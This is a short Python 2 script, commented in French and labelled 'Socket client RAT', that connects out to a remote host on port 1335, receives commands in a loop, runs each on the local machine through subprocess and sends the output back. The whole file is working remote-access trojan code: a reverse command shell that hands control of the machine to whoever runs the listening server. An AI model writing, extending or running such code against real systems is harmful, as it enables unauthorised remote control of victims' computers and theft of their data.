#######################################################
#            Socket client RAT                        #
#                 Yakumai                             #
#######################################################
import socket
import subprocess

target_host = "192.168.1.1"
target_port = 1335

#creation socket
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print 'connexion à l\'hote distant'
client.connect((target_host,target_port)) 

while 1:
      #envoie du resultat au serveur
      command = client.recv(4096)
      if command=="end":
            break
      proc2 = subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

      args = proc2.stdout.read()

      client.send(args)


client.close()


